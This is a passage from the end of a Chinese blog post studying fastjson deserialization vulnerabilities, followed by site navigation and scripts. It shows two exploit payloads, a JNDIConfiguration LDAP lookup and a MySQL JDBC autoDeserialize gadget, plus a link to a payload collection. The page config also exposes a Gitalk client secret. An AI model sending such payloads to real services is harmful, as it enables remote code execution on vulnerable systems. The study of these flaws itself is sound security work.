+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;org.apache.commons.configuration.JNDIConfiguration&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;prefix&quot;</span><span class="punctuation">:</span> <span class="string">&quot;ldap://127.0.0.1:23457/Command8&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
+
+<p>&lt; 1.2.68</p>
+<p>无需AutoTypeSupport</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  <span class="string">&quot;@type&quot;</span>: <span class="string">&quot;java.lang.AutoCloseable&quot;</span>,</span><br><span class="line">  <span class="string">&quot;@type&quot;</span>: <span class="string">&quot;com.mysql.jdbc.JDBC4Connection&quot;</span>,</span><br><span class="line">  <span class="string">&quot;hostToConnectTo&quot;</span>: <span class="string">&quot;127.0.0.1&quot;</span>,</span><br><span class="line">  <span class="string">&quot;portToConnectTo&quot;</span>: <span class="number">58225</span>,</span><br><span class="line">  <span class="string">&quot;info&quot;</span>: &#123;</span><br><span class="line">    <span class="string">&quot;user&quot;</span>: <span class="string">&quot;deser_CC31_calc&quot;</span>,</span><br><span class="line">    <span class="string">&quot;statementInterceptors&quot;</span>: <span class="string">&quot;com.mysql.jdbc.interceptors.ServerStatusDiffInterceptor&quot;</span>,</span><br><span class="line">    <span class="string">&quot;autoDeserialize&quot;</span>: <span class="string">&quot;true&quot;</span>,</span><br><span class="line">    <span class="string">&quot;NUM_HOSTS&quot;</span>: <span class="string">&quot;1&quot;</span></span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="string">&quot;databaseToConnectTo&quot;</span>: <span class="string">&quot;test&quot;</span>,</span><br><span class="line">  <span class="string">&quot;url&quot;</span>: <span class="string">&quot;jdbc:mysql://127.0.0.1:58225/test?autoDeserialize=true&amp;statementInterceptors=com.mysql.jdbc.interceptors.ServerStatusDiffInterceptor&amp;user=deser_CC31_calc&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<h3 id="其他payload"><a href="#其他payload" class="headerlink" title="其他payload"></a>其他payload</h3><p><a target="_blank" rel="noopener" href="https://github.com/lemono0/FastJsonParty/tree/main">FastJsonPart</a></p>
+<h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>fastjson应该是我第一个搞了这么久的java组件</p>
+<p>每次版本的更新就像每道更难的ctf题一样</p>
+<p>这里感谢一些师傅的文章分享 没有这些文章 我是不可能搞明白这些的</p>
+<p><a target="_blank" rel="noopener" href="https://drun1baby.top/2022/08/08/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Fastjson%E7%AF%8703-Fastjson%E5%90%84%E7%89%88%E6%9C%AC%E7%BB%95%E8%BF%87%E5%88%86%E6%9E%90/#0x04-1-2-25-1-2-41-%E8%A1%A5%E4%B8%81%E7%BB%95%E8%BF%87">drun1baby师傅的Java反序列化Fastjson篇</a></p>
+<p><a target="_blank" rel="noopener" href="https://nivi4.notion.site/fastjson-873722f1374b4c4e99cc3283a38dfb37">nivi4师傅的fastjson</a></p>
+
+      
+    </div>
+    <footer class="article-footer">
+      
+      
+      
+      
+      
+      
+      
+      
+      
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item" data-aos="zoom-in"><a class="article-tag-list-link" href="/tags/fastjson/" rel="tag" title="fastjson">fastjson</a></li><li class="article-tag-list-item" data-aos="zoom-in"><a class="article-tag-list-link" href="/tags/java/" rel="tag" title="java">java</a></li><li class="article-tag-list-item" data-aos="zoom-in"><a class="article-tag-list-link" href="/tags/java%E7%BB%84%E4%BB%B6/" rel="tag" title="java组件">java组件</a></li><li class="article-tag-list-item" data-aos="zoom-in"><a class="article-tag-list-link" href="/tags/%E7%9F%A5%E8%AF%86/" rel="tag" title="知识">知识</a></li></ul>
+
+
+    </footer>
+  </div>
+  
+  <nav id="article-nav" aria-label="Article navigation" data-aos="fade-up">
+    
+      
+      <div class="article-nav-link-wrap left">
+        
+          
+          
+            <img data-src="/covers/2323.gif" data-sizes="auto" alt="若依v4.6" class="lazyload">
+          
+        
+        <a href="/2026/05/01/%E8%8B%A5%E4%BE%9Dv4-6/" aria-label="前一篇: 若依v4.6" title="前一篇: 若依v4.6"></a>
+        <div class="article-nav-caption">前一篇</div>
+        <h3 class="article-nav-title">
+          
+            若依v4.6
+          
+        </h3>
+      </div>
+    
+    
+    
+    <div class="article-nav-link-wrap right">
+      
+        
+        
+          <img data-src="/covers/104923326_p0.png" data-sizes="auto" alt="华夏erp 2.3" class="lazyload">
+        
+      
+      <a href="/2026/04/20/%E5%8D%8E%E5%A4%8FerpV2.3/" aria-label="后一篇: 华夏erp 2.3"  title="后一篇: 华夏erp 2.3"></a>
+      <div class="article-nav-caption">后一篇</div>
+      <h3 class="article-nav-title">
+        
+          华夏erp 2.3
+        
+      </h3>
+    </div>
+    
+  </nav>
+
+
+</article>
+
+
+
+
+
+
+
+
+
+  <section id="comments" data-aos="fade-up">
+    <div class="comment-header">
+      
+      
+        
+      
+      <h2 class="comment-title">说些什么吧！</h2>
+      <div class="comment-selector">
+        <div class="comment-selector-wrap">
+            
+            <div class="selector-item" data-selector="gitalk">
+              <span>gitalk</span>
+            </div>
+            
+        </div>
+      </div>
+    </div>
+    <div class="comment-content">
+      
+        <div class="comment gitalk-comment" data-aos="fade-up"
+          id="gitalk-comment">
+        </div>
+      
+    </div>
+  </section>
+
+
+</section>
+        </div>
+        <footer id="footer" aria-label="Site footer">
+  <div style="width: 100%; overflow: hidden">
+    <div class="footer-line"></div>
+  </div>
+  <div id="footer-info">
+    
+    <div>
+      <span class="icon-copyright"></span>
+      
+      
+      
+        2025-2026
+      
+      <span class="footer-info-sep rotate"></span>
+      S@Ku_yA
+    </div>
+    
+      <div>
+        基于&nbsp;<a href="https://hexo.io/" rel="noopener nofollow noreferrer" target="_blank">Hexo</a>&nbsp;
+        Theme.<a href="https://github.com/D-Sketon/hexo-theme-reimu" rel="noopener nofollow noreferrer" target="_blank">Reimu</a>
+      </div>
+    
+    
+      <div>
+        <span class="icon-brush"></span>
+        71.1k
+        &nbsp;|&nbsp;
+        <span class="icon-coffee"></span>
+        05:25
+      </div>
+    
+    
+    
+    
+    
+      <div>
+        <span class="icon-eye"></span>
+        <span id="busuanzi_container_site_pv">总访问量&nbsp;<span id="busuanzi_value_site_pv"></span></span>
+        &nbsp;|&nbsp;
+        <span class="icon-user"></span>
+        <span id="busuanzi_container_site_uv">总访客量&nbsp;<span id="busuanzi_value_site_uv"></span></span>
+      </div>
+    
+  </div>
+</footer>
+
+        
+          <div class="sidebar-top">
+            <div class="sidebar-top-taichi rotate"></div>
+            <div class="arrow-up"></div>
+          </div>
+        
+        <div id="mask" class="hide"></div>
+      </div>
+      <nav id="mobile-nav" aria-label="Mobile navigation">
+  <div class="sidebar-wrap">
+    
+      
+        <div class="sidebar-toc-sidebar"><h3 class="toc-title">文章目录</h3>
+<div class="sidebar-toc-wrapper toc-div-class" >
+  
+    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#fastjson"><span class="toc-number">1.</span> <span class="toc-text">fastjson</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#fastjson%E5%8E%9F%E7%90%86"><span class="toc-number">1.1.</span> <span class="toc-text">fastjson原理</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%B0%83%E8%AF%95%E4%B8%80%E4%B8%8B%E5%AF%B9%E8%B1%A1-to-json%E7%9A%84%E6%BA%90%E7%A0%81"><span class="toc-number">1.1.1.</span> <span class="toc-text">调试一下对象 to json的源码</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-json-to-javabean%E5%AF%B9%E8%B1%A1"><span class="toc-number">1.1.2.</span> <span class="toc-text">反序列化 json to javabean对象</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%80%BB%E7%BB%93"><span class="toc-number">1.1.3.</span> <span class="toc-text">总结</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%85%B6%E4%BB%96"><span class="toc-number">1.1.4.</span> <span class="toc-text">其他</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%A7%81%E6%9C%89%E5%B1%9E%E6%80%A7-%E5%85%B1%E6%9C%89%E5%B1%9E%E6%80%A7"><span class="toc-number">1.1.4.1.</span> <span class="toc-text">私有属性 共有属性</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%A7%81%E6%9C%89%E5%B1%9E%E6%80%A7%E4%BB%8D%E7%84%B6%E6%83%B3%E8%A2%AB%E8%B5%8B%E5%80%BC%E8%AF%A5%E6%80%8E%E4%B9%88%E5%8A%9E"><span class="toc-number">1.1.4.2.</span> <span class="toc-text">私有属性仍然想被赋值该怎么办</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#getter-setter"><span class="toc-number">1.1.4.3.</span> <span class="toc-text">getter setter</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#fastjson%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90"><span class="toc-number">1.2.</span> <span class="toc-text">fastjson漏洞分析</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-2-0-1-2-24"><span class="toc-number">1.2.1.</span> <span class="toc-text">1.2.0~1.2.24</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%88%86%E6%9E%90%E4%B8%80%E4%B8%8B"><span class="toc-number">1.2.1.1.</span> <span class="toc-text">分析一下</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%80%BB%E7%BB%93%E4%B8%80%E4%B8%8B"><span class="toc-number">1.2.1.2.</span> <span class="toc-text">总结一下</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#1-2-25-1-2-41"><span class="toc-number">1.2.2.</span> <span class="toc-text">1.2.25~1.2.41</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%88%86%E6%9E%90%E4%B8%80%E4%B8%8B-1"><span class="toc-number">1.2.2.1.</span> <span class="toc-text">分析一下</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%80%BB%E7%BB%93%E4%B8%80%E4%B8%8B-1"><span class="toc-number">1.2.2.2.</span> <span class="toc-text">总结一下</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#1-2-42"><span class="toc-number">1.2.3.</span> <span class="toc-text">1.2.42</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%88%86%E6%9E%90%E4%B8%80%E4%B8%8B-2"><span class="toc-number">1.2.3.1.</span> <span class="toc-text">分析一下</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%80%BB%E7%BB%93%E4%B8%80%E4%B8%8B-2"><span class="toc-number">1.2.3.2.</span> <span class="toc-text">总结一下</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#1-2-43"><span class="toc-number">1.2.4.</span> <span class="toc-text">1.2.43</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%88%86%E6%9E%90%E4%B8%80%E4%B8%8B-3"><span class="toc-number">1.2.4.1.</span> <span class="toc-text">分析一下</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%80%BB%E7%BB%93%E4%B8%80%E4%B8%8B-3"><span class="toc-number">1.2.4.2.</span> <span class="toc-text">总结一下</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#1-2-44"><span class="toc-number">1.2.5.</span> <span class="toc-text">1.2.44</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%88%86%E6%9E%90%E4%B8%80%E4%B8%8B-4"><span class="toc-number">1.2.5.1.</span> <span class="toc-text">分析一下</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link"><span class="toc-number">1.2.6.</span> <span class="toc-text">&lt;&#x3D;1.2.47</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%88%86%E6%9E%90%E4%B8%80%E4%B8%8B-5"><span class="toc-number">1.2.6.1.</span> <span class="toc-text">分析一下</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%80%BB%E7%BB%93%E4%B8%80%E4%B8%8B-4"><span class="toc-number">1.2.6.2.</span> <span class="toc-text">总结一下</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#1-2-48"><span class="toc-number">1.2.7.</span> <span class="toc-text">1.2.48</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%88%86%E6%9E%90"><span class="toc-number">1.2.7.1.</span> <span class="toc-text">分析</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#-1"><span class="toc-number">1.2.8.</span> <span class="toc-text">&lt;&#x3D; 1.2.68</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%88%86%E6%9E%90%E4%B8%80%E4%B8%8B-6"><span class="toc-number">1.2.8.1.</span> <span class="toc-text">分析一下</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%80%BB%E7%BB%93%E4%B8%80%E4%B8%8B-5"><span class="toc-number">1.2.8.2.</span> <span class="toc-text">总结一下</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#1-2-68"><span class="toc-number">1.2.9.</span> <span class="toc-text">&#x3D;&gt; 1.2.68</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#1-2-69"><span class="toc-number">1.2.10.</span> <span class="toc-text">1.2.69</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#1-2-83"><span class="toc-number">1.2.11.</span> <span class="toc-text">1.2.83</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#fastjson2"><span class="toc-number">1.2.12.</span> <span class="toc-text">fastjson2</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%85%B6%E4%BB%96-1"><span class="toc-number">1.3.</span> <span class="toc-text">其他</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#payload%E5%A4%A7%E5%85%A8"><span class="toc-number">1.4.</span> <span class="toc-text">payload大全</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%85%B6%E4%BB%96payload"><span class="toc-number">1.4.1.</span> <span class="toc-text">其他payload</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%B0%8F%E7%BB%93"><span class="toc-number">1.5.</span> <span class="toc-text">小结</span></a></li></ol></li></ol>
+  
+</div>
+</div>
+        <div class="sidebar-common-sidebar hidden"><div class="sidebar-author">
+  <img data-src="/avatar/avatar.webp" data-sizes="auto" alt="S@Ku_yA" class="lazyload">
+  <div class="sidebar-author-name">S@Ku_yA</div>
+  <div class="sidebar-description"></div>
+</div>
+<div class="sidebar-state">
+  <div class="sidebar-state-article">
+    <div>文章</div>
+    <div class="sidebar-state-number">43</div>
+  </div>
+  <div class="sidebar-state-category">
+    <div>分类</div>
+    <div class="sidebar-state-number">9</div>
+  </div>
+  <div class="sidebar-state-tag">
+    <div>标签</div>
+    <div class="sidebar-state-number">26</div>
+  </div>
+</div>
+<div class="sidebar-social">
+  
+</div>
+<div class="sidebar-menu">
+  
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/" aria-label="首页"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          
+            &#xe62b;
+          
+        </div>
+        <div class="sidebar-menu-link">首页</div>
+      </div>
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/archives" aria-label="归档"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          
+            &#xe62b;
+          
+        </div>
+        <div class="sidebar-menu-link">归档</div>
+      </div>
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/about" aria-label="关于"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          
+            &#xe62b;
+          
+        </div>
+        <div class="sidebar-menu-link">关于</div>
+      </div>
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/friend" aria-label="友链"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          
+            &#xe62b;
+          
+        </div>
+        <div class="sidebar-menu-link">友链</div>
+      </div>
+    
+  
+</div>
+</div>
+      
+    
+  </div>
+  
+    
+      <div class="sidebar-btn-wrapper">
+        <div class="sidebar-toc-btn current"></div>
+        <div class="sidebar-common-btn"></div>
+      </div>
+    
+  
+</nav>
+
+    </div>
+    
+      <div class="site-search">
+        <div class="reimu-popup popup">
+          <div class="reimu-search">
+            <div class="reimu-search-input-icon"></div>
+            <div id="reimu-search-input"></div>
+            <div class="popup-btn-close"></div>
+          </div>
+          <div class="reimu-results">
+            <div id="reimu-stats"></div>
+            <div id="reimu-hits"></div>
+            <div id="reimu-pagination" class="reimu-pagination"></div>
+          </div>
+          <img class="reimu-bg" src="/images/reimu.png"/>
+        </div>
+      </div>
+    
+    
+    
+    
+<script src="https://npm.webcache.cn/lazysizes@5.3.2/lazysizes.min.js" integrity="sha384-3gT&#x2F;vsepWkfz&#x2F;ff7PpWNUeMzeWoH3cDhm&#x2F;A8jM7ouoAK0&#x2F;fP&#x2F;9bcHHR5kHq2nf+e" crossorigin="anonymous"></script>
+
+
+<script src="https://npm.webcache.cn/clipboard@2.0.11/dist/clipboard.min.js" integrity="sha384-J08i8An&#x2F;QeARD9ExYpvphB8BsyOj3Gh2TSh1aLINKO3L0cMSH2dN3E22zFoXEi0Q" crossorigin="anonymous"></script>
+
+
+
+
+
+<script src="/js/script.js"></script>
+
+
+
+  
+<script src="/js/aos.js"></script>
+
+  <script>
+    var aosInit = () => {
+      AOS.init({
+        duration: 1000,
+        easing: "ease",
+        once: true,
+        offset: 50,
+      });
+    };
+    if (document.readyState === 'loading') {
+      document.addEventListener('DOMContentLoaded', aosInit);
+    } else {
+      aosInit();
+    }
+  </script>
+
+
+
+<script src="/js/pjax_script.js" data-pjax></script>
+
+
+
+  
+<script src="/js/generator_search.js" defer></script>
+
+
+
+
+
+
+  
+<script src="https://npm.webcache.cn/mouse-firework@0.1.1/dist/index.umd.js" integrity="sha384-8LyaidD9GPxQQgLJO&#x2F;WRw&#x2F;O2h3BoNq&#x2F;ApI&#x2F;ecpvM6RsrCz2qP2ppBXUKihP4V&#x2F;2d" crossorigin="anonymous"></script>
+
+  <script>
+    window.firework && window.firework(JSON.parse('{"excludeElements":["a","button"],"particles":[{"shape":"circle","move":["emit"],"easing":"easeOutExpo","colors":["var(--red-1)","var(--red-2)","var(--red-3)","var(--red-4)"],"number":20,"duration":[1200,1800],"shapeOptions":{"radius":[16,32],"alpha":[0.3,0.5]}},{"shape":"circle","move":["diffuse"],"easing":"easeOutExpo","colors":["var(--red-0)"],"number":1,"duration":[1200,1800],"shapeOptions":{"radius":20,"alpha":[0.2,0.5],"lineWidth":6}}]}'))
+  </script>
+
+
+
+
+
+
+
+
+
+
+<div id="lazy-script">
+  <div>
+    
+      
+      
+      <script data-pjax>
+        window.REIMU_POST = {
+          author: "S@Ku_yA",
+          title: "fastjson",
+          url: "http://example.com/2026/04/24/fastjson/",
+          excerpt: "",
+          description: "",
+          stripContent: "fastjsonfastjson是阿里巴巴提供的高性能json数据解析库 可以高效的将java对象转换为json数据  也可以接收json数据转换为原来的javaBean  虽然是一个很好用的json数据解析库 但是漏洞频出 java安全必学的一个组件 fastjson原理配置依赖 12345&amp;lt;dependency&amp;gt;    &amp;lt;groupId&amp;gt;com.alibaba&amp;lt;/groupId&amp;gt;    &amp;lt;artifactId&amp;gt;fastjson&amp;lt;/arti",
+          date: "Fri Apr 24 2026 13:45:59 GMT+0800",
+          updated: "Fri May 15 2026 20:40:32 GMT+0800",
+          cover: "/images/banner.webp",
+        };
+      </script>
+       
+    
+    
+      
+        
+<script src="/js/insert_highlight.js" data-pjax></script>
+
+        
+      
+    
+    
+      <script type="module" data-pjax>
+        const PhotoSwipeLightbox = (await safeImport("https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe-lightbox.esm.min.js", "sha384-DiL6M/gG+wmTxmCRZyD1zee6lIhawn5TGvED0FOh7fXcN9B0aZ9dexSF/N6lrZi/")).default;
+        const initPswp = (gallery, children) => {
+          if (_$$(`${gallery} ${children}`).length > 0) {
+            new PhotoSwipeLightbox({
+              gallery,
+              children,
+              pswpModule: () => safeImport("https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe.esm.min.js", "sha384-WkkO3GCmgkC3VQWpaV8DqhKJqpzpF9JoByxDmnV8+oTJ7m3DfYEWX1fu1scuS4+s")
+            }).init();
+          }
+        }
+        const pswp = () => {
+          initPswp('.article-entry', 'a.article-gallery-item');
+          initPswp('.article-gallery', 'a.article-gallery-item');
+          window.lightboxStatus = 'done';
+          window.removeEventListener('lightbox:ready', pswp);
+        }
+        if(window.lightboxStatus === 'ready') {
+          pswp()
+        } else {
+          window.addEventListener('lightbox:ready', pswp);
+        }
+      </script>
+      
+        
+
+
+
+
+
+
+
+
+<script data-pjax>
+  var loadScript = (src, integrity) => {
+    const script = document.createElement('script');
+    script.src = src;
+    if (integrity) script.integrity = integrity;
+    script.crossOrigin = 'anonymous';
+    return script;
+  };
+
+  var commentConfigKeys = ["gitalk"];
+  var commentConfig = {
+    
+    
+    
+    
+    gitalk: {
+      enable: true,
+      load: () => {
+        const container = document.querySelector('.gitalk-comment');
+        if (!container) return;
+        container.style.display = 'block';
+
+        const script = loadScript(
+          'https://npm.webcache.cn/gitalk@1.8.0/dist/gitalk.min.js',
+          'sha384-kspnZUWBoSWwoJHa0hBCXYbHGbhvU/lcEH5O8eVbSDhbPwsiVUTp/aGX/z/5EuMA'
+        );
+
+        script.onload = () => {
+          if (false) {
+            const md5Script = loadScript(
+              'https://npm.webcache.cn/blueimp-md5@2.19.0/js/md5.min.js',
+              'sha384-JmVtRz6RWiXnA14QbIOJzPuU3MidULOpBP66deeLLyyoF4Tr/gZlbkHkL6vTthxH'
+            );
+            md5Script.onload = initGitalk;
+            document.head.appendChild(md5Script);
+          } else {
+            initGitalk();
+          }
+        }
+        document.head.appendChild(script);
+
+        function initGitalk() {
+          var gitalkId = location.pathname;
+          var gitalk = new Gitalk({
+            clientID: 'Ov23li1mTMN9Ccjmkh5p',
+            clientSecret: 'ea6c17281ea880a0862ad92a2aec900906d054f0',
+            repo: 'my_blog',
+            owner: 'sakuya-sys',
+            admin: ["sakuya-sys"],
+            id: gitalkId,
+            distractionFreeMode: false,
+            language: document.documentElement.lang || 'en',
+          })
+          gitalk.render('gitalk-comment');
+        }
+      }
+    },
+    
+    
+  }
+  commentConfig.enable = commentConfigKeys.some(key => commentConfig[key].enable);
+
+  var defaultComment = '';
+  if (commentConfig.enable) {
+    // 1. 首先检查localStorage中是否有保存的评论类型
+    var savedCommentType = localStorage.getItem('commentType');
+    
+    // 2. 如果localStorage中有值且对应的评论系统可用，就使用它
+    if (savedCommentType) {
+      if (commentConfig[savedCommentType]?.enable) {
+        defaultComment = savedCommentType;
+      }
+    }
+    
+    // 3. 如果localStorage无效，检查配置的默认评论系统
+    if (!defaultComment) {
+      var configDefault = 'waline';
+      if (commentConfig[configDefault]?.enable) {
+        defaultComment = configDefault;
+      }
+    }
+    
+    // 4. 如果前两项都无效，按指定顺序找到第一个可用的评论系统
+    if (!defaultComment) {
+      defaultComment = commentConfigKeys.find(sys => commentConfig[sys].enable) || '';
+    }
+  }
+  function loadComments() {
+    if (!commentConfig.enable) return;
+    const loadedComments = {
+      valine: false,
+      waline: false,
+      twikoo: false,
+      gitalk: false,
+      giscus: false
+    };
+
+    // 隐藏所有评论容器
+    const hideAllComments = () => {
+      const commentContainers = document.querySelectorAll('.comment');
+      commentContainers.forEach(container => {
+        container.style.display = 'none';
+      });
+    };
+
+    // 按需加载评论系统
+    const loadCommentSystem = (type) => {
+      if (loadedComments[type]) {
+        // 如果已加载，只需显示对应容器
+        document.querySelector(`.${type}-comment`).style.display = 'block';
+        return;
+      }
+
+      // 根据类型加载对应的脚本
+      commentConfig[type]?.load();
+      loadedComments[type] = true;
+    };
+
+    // 评论组件选择器
+    const changeActiveCommentItems = (item) => {
+      const commentItems = document.querySelectorAll('.selector-item');
+      for (let i = 0; i < commentItems.length; i++) {
+        commentItems[i].classList.remove('active');
+      }
+      item.classList.add('active');
+
+      // 获取要加载的评论系统类型
+      const commentType = item.getAttribute('data-selector');
+
+      // 隐藏所有评论系统
+      hideAllComments();
+
+      // 加载选中的评论系统
+      loadCommentSystem(commentType);
+    };
+
+    const commentInit = () => {
+      // 评论组件选择器点击事件
+      const commentItems = document.querySelectorAll('.selector-item');
+      for (let item of commentItems) {
+        item.addEventListener('click', () => {
+          // 保存选择器状态
+          const commentType = item.getAttribute('data-selector');
+          window.localStorage.setItem('commentType', commentType);
+          // 切换选中状态
+          changeActiveCommentItems(item);
+        });
+      }
+
+      // 检查是否需要加载默认评论系统
+      if (defaultComment) {
+        const defaultSelectorItem = document.querySelector(`[data-selector="${defaultComment}"]`);
+        if (!defaultSelectorItem) return;
+        defaultSelectorItem.style.display = 'block';
+        defaultSelectorItem.classList.add('active');
+        loadCommentSystem(defaultComment);
+      }
+    }
+
+    if (document.readyState === 'loading') {
+      document.addEventListener('DOMContentLoaded', commentInit);
+    } else {
+      commentInit();
+    }
+  };
+  loadComments();
+</script>
+
+      
+    
+  </div>
+</div>
+
+
+  <script>
+    console.log(String.raw`%c 
+ ______     ______     __     __    __     __  __    
+/\  == \   /\  ___\   /\ \   /\ "-./  \   /\ \/\ \   
+\ \  __<   \ \  __\   \ \ \  \ \ \-./\ \  \ \ \_\ \  
+ \ \_\ \_\  \ \_____\  \ \_\  \ \_\ \ \_\  \ \_____\ 
+  \/_/ /_/   \/_____/   \/_/   \/_/  \/_/   \/_____/ 
+                                                  
+`,'color: #ff5252;')
+    console.log('%c Theme.Reimu v' + '1.10.0' + ' %c https://github.com/D-Sketon/hexo-theme-reimu ', 'color: white; background: #ff5252; padding:5px 0;', 'padding:4px;border:1px solid #ff5252;')
+  </script>
+  
+
+
+
+  
+<script src="https://npm.webcache.cn/busuanzi@2.3.0/bsz.pure.mini.js" integrity="sha384-0M75wtSkhjIInv4coYlaJU83+OypaRCIq2SukQVQX04eGTCBXJDuWAbJet56id+S" crossorigin="anonymous" async></script>
+
+
+
+
+<script>
+  if ('serviceWorker' in navigator) {
+    navigator.serviceWorker.getRegistrations().then((registrations) => {
+      for (let registration of registrations) {
+        registration.unregister();
+      }
+    });
+  }
+</script>
+
+
+
+
+
+
+
+
+
+    
+  </body>
+  </html>
+
